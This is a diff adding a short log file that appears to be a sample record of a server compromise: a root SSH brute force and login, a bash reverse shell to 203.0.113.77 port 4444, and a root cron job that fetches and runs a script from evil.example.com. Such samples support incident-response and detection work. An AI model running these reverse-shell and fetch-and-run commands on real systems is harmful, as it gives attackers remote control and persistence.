@@ -1,0 +1,5 @@
+2026-05-19 09:01:11 sshd[1201]: Failed password for root from 198.51.100.23 port 54210 ssh2
+2026-05-19 09:03:22 sshd[1201]: Accepted password for root from 198.51.100.23 port 54210 ssh2
+2026-05-19 09:05:01 root pts/0 198.51.100.23
+2026-05-19 09:06:14 www-data 2314 0.0 0.1 /bin/bash -c bash -i >& /dev/tcp/203.0.113.77/4444 0>&1
+2026-05-19 09:07:30 root crontab: */5 * * * * curl http://evil.example.com/a.sh | sh
